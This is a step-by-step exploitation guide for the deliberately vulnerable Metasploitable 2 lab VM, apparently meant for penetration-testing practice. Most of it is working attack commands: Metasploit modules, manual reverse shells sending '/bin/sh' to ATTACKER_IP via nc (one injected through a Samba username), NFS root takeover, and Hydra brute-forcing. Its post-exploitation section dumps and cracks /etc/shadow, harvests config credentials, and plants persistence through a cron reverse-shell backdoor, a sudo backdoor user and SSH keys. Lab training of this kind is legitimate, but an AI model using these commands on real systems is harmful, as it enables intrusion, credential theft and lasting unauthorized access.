# Metasploitable 2 - Complete Exploitation Guide

## 🎯 Target Overview

Metasploitable 2 is an intentionally vulnerable Linux VM designed for practicing penetration testing with Metasploit Framework.

**Credentials:** msfadmin / msfadmin  
**Typical IP:** 192.168.56.101 (Host-Only network)

---

## Setup

### VirtualBox Setup
```
1. Download Metasploitable 2 from SourceForge
2. Extract the ZIP file
3. Open VirtualBox → New
4. Name: Metasploitable2
5. Type: Linux, Version: Ubuntu 64-bit
6. RAM: 512MB+
7. Use existing virtual hard disk → Select .vmdk file
8. Settings → Network → Host-Only Adapter
9. Start VM
10. Login: msfadmin / msfadmin
11. Get IP: ifconfig
```

### Attacking Machine Setup
```bash
# Use Kali Linux or Parrot OS
# Ensure on same network (Host-Only)
# Verify connectivity:
ping 192.168.56.101
```

---

## Phase 1: Reconnaissance

### Host Discovery
```bash
# Find target on network
nmap -sn 192.168.56.0/24

# Result: 192.168.56.101 is up
```

### Port Scanning
```bash
# Quick scan
nmap -T4 -F 192.168.56.101

# Full TCP scan with versions
nmap -sS -sV -O -p- -T4 192.168.56.101 -oN ms2_full_scan.txt

# UDP scan (slow but important)
nmap -sU --top-ports 100 192.168.56.101
```

### Expected Results
```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X
445/tcp   open  netbios-ssn Samba smbd 3.X
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       
514/tcp   open  shell       
1099/tcp  open  java-rmi    Java RMI
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a
3632/tcp  open  distccd     distccd v1
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv
8180/tcp  open  http        Apache Tomcat
8787/tcp  open  drb         Ruby DRb RMI
```

### Vulnerability Scanning
```bash
# Nmap vulnerability scripts
nmap --script vuln 192.168.56.101 -oN ms2_vuln_scan.txt

# Specific service scripts
nmap --script smb-vuln* -p 445 192.168.56.101
nmap --script ftp-vuln* -p 21 192.168.56.101
```

---

## Phase 2: Exploitation

### Exploit 1: vsftpd 2.3.4 Backdoor (Port 21)
**CVE:** CVE-2011-2523  
**Difficulty:** Easy  
**Result:** Root shell

```bash
msfconsole -q

use exploit/unix/ftp/vsftpd_234_backdoor
show options

set RHOSTS 192.168.56.101
exploit

# Verify access
id
# uid=0(root) gid=0(root)
```

**Manual Exploitation:**
```bash
# Trigger backdoor by sending :) in username
telnet 192.168.56.101 21
USER evil:)
PASS anything

# Connect to backdoor shell
nc 192.168.56.101 6200
```

---

### Exploit 2: Samba usermap_script (Port 445)
**CVE:** CVE-2007-2447  
**Difficulty:** Easy  
**Result:** Root shell

```bash
msfconsole -q

use exploit/multi/samba/usermap_script
show options

set RHOSTS 192.168.56.101
set LHOST eth0
exploit

# Shell obtained
whoami
# root
```

**Manual Exploitation:**
```bash
# Username command injection
smbclient //192.168.56.101/tmp
logon "/=`nohup nc -e /bin/sh ATTACKER_IP 4444`"

# Listen on attacker:
nc -lvnp 4444
```

---

### Exploit 3: UnrealIRCd Backdoor (Port 6667)
**CVE:** CVE-2010-2075  
**Difficulty:** Easy  
**Result:** Root shell

```bash
msfconsole -q

use exploit/unix/irc/unreal_ircd_3281_backdoor
show options

set RHOSTS 192.168.56.101
set LHOST eth0
exploit
```

**Manual Exploitation:**
```bash
# Send backdoor trigger
echo "AB; nc -e /bin/sh ATTACKER_IP 4444" | nc 192.168.56.101 6667
```

---

### Exploit 4: distcc (Port 3632)
**CVE:** CVE-2004-2687  
**Difficulty:** Easy  
**Result:** User shell (daemon)

```bash
msfconsole -q

use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.101
set LHOST eth0
exploit

# Lower privilege shell
id
# uid=1(daemon)
```

---

### Exploit 5: Java RMI (Port 1099)
**Difficulty:** Medium  
**Result:** Root shell

```bash
msfconsole -q

use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.56.101
set LHOST eth0
exploit
```

---

### Exploit 6: PostgreSQL (Port 5432)
**Difficulty:** Easy  
**Result:** Database access → Shell

```bash
# Default credentials: postgres / postgres
psql -h 192.168.56.101 -U postgres

# Or via Metasploit
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.56.101
run

# Get shell via SQL
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.56.101
set LHOST eth0
exploit
```

---

### Exploit 7: MySQL (Port 3306)
**Difficulty:** Easy  
**Result:** Database access

```bash
# Default credentials: root / (empty)
mysql -h 192.168.56.101 -u root

# Enumerate
SHOW DATABASES;
USE mysql;
SELECT user,password FROM user;

# Via Metasploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.56.101
run
```

---

### Exploit 8: Apache Tomcat (Port 8180)
**Difficulty:** Medium  
**Result:** Web shell

```bash
# Brute force manager credentials
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.101
set RPORT 8180
run

# Default: tomcat / tomcat

# Deploy WAR shell
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.101
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST eth0
exploit
```

---

### Exploit 9: PHP CGI (Port 80)
**CVE:** CVE-2012-1823  
**Difficulty:** Medium  
**Result:** www-data shell

```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.56.101
set LHOST eth0
exploit
```

---

### Exploit 10: VNC (Port 5900)
**Difficulty:** Easy  
**Result:** GUI access

```bash
# Brute force password
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.56.101
run

# Password: password

# Connect
vncviewer 192.168.56.101:5900
```

---

### Exploit 11: Ingreslock (Port 1524)
**Difficulty:** Trivial  
**Result:** Root shell

```bash
# Direct root shell - no exploit needed!
nc 192.168.56.101 1524

id
# uid=0(root)
```

---

### Exploit 12: NFS Misconfiguration (Port 2049)
**Difficulty:** Medium  
**Result:** Root via SSH

```bash
# Check exports
showmount -e 192.168.56.101
# Export list: / *

# Mount the root filesystem
mkdir /tmp/nfs
mount -t nfs 192.168.56.101:/ /tmp/nfs

# Add SSH key
cat ~/.ssh/id_rsa.pub >> /tmp/nfs/root/.ssh/authorized_keys

# SSH as root
ssh root@192.168.56.101
```

---

### Exploit 13: Telnet (Port 23)
**Difficulty:** Easy  
**Result:** User shell

```bash
# Brute force with Hydra
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.101

# Password: msfadmin

# Connect
telnet 192.168.56.101
```

---

### Exploit 14: rlogin/rsh (Ports 512-514)
**Difficulty:** Easy  
**Result:** Root shell

```bash
# If .rhosts allows:
rlogin -l root 192.168.56.101

# Or rsh
rsh 192.168.56.101
```

---

## Phase 3: Post-Exploitation

### Shell Upgrade
```bash
# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'

# Fix terminal
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

### Password Extraction
```bash
# Get shadow file
cat /etc/shadow

# Unshadow for John
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Credential Harvesting
```bash
# MySQL creds
cat /var/www/dvwa/config/config.inc.php
cat /var/www/mutillidae/config.inc

# PostgreSQL
cat /etc/postgresql/8.3/main/pg_hba.conf

# Tomcat
cat /etc/tomcat5.5/tomcat-users.xml
```

### Persistence
```bash
# Add SSH key
echo "ssh-rsa YOUR_KEY" >> /root/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash -G sudo hacker
echo "hacker:password123" | chpasswd

# Cron backdoor
echo "* * * * * root nc -e /bin/bash ATTACKER_IP 4444" >> /etc/crontab
```

---

## Phase 4: Network Pivoting

### If MS2 has multiple interfaces:
```bash
# Check interfaces
ifconfig

# Set up port forwarding
# From Meterpreter:
run autoroute -s INTERNAL_NETWORK/24

# SOCKS proxy
use auxiliary/server/socks_proxy
run

# Use proxychains on attacker
proxychains nmap INTERNAL_TARGET
```

---

## Summary: Quick Wins

| Service | Port | Exploit | Difficulty | Shell |
|---------|------|---------|------------|-------|
| Ingreslock | 1524 | Direct connect | Trivial | Root |
| vsftpd | 21 | Backdoor | Easy | Root |
| Samba | 445 | usermap_script | Easy | Root |
| UnrealIRCd | 6667 | Backdoor | Easy | Root |
| distcc | 3632 | CVE-2004-2687 | Easy | Daemon |
| VNC | 5900 | Weak password | Easy | GUI |
| MySQL | 3306 | No password | Easy | DB |
| PostgreSQL | 5432 | Default creds | Easy | DB/Shell |
| Tomcat | 8180 | Default creds | Medium | Web |
| NFS | 2049 | Misconfigured | Medium | Root |

---

## Recommended Learning Path

1. **Start Simple:** Ingreslock, vsftpd, Samba
2. **Learn Metasploit:** Practice with each exploit
3. **Try Manual:** Recreate exploits without Metasploit
4. **Post-Exploit:** Practice persistence and pivoting
5. **Document:** Write your own report

---

*Remember: Only practice on authorized systems!*
